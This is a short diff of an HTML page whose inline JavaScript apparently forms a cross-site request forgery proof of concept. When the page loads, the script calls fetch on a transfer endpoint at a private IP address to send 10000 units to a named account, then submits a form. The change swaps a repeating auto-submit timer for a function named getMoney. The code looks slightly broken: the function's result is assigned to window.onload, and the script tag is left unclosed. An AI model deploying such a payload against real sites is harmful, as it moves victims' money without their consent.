@@ -29,8 +29,7 @@
     </form>
 
     <script type="text/javascript">
-                  window.onload=function(){
-                      var auto = setTimeout(function(){ autoRefresh(); }, 100);
+              function getMoney(){
                       let data = {"user_to":"user1@gmail.com","amount":10000};
                       function submitform(){
                         fetch("http://192.168.2.98:49698/transfer", {
@@ -42,11 +41,7 @@
         });
                         document.forms["myForm"].submit();
       }
-
-                      function autoRefresh(){
-                         clearTimeout(auto);
-                         auto = setTimeout(function(){ submitform(); autoRefresh(); }, 10000);
-                      }
+      window.onload =getMoney()
                   }
               </script
 
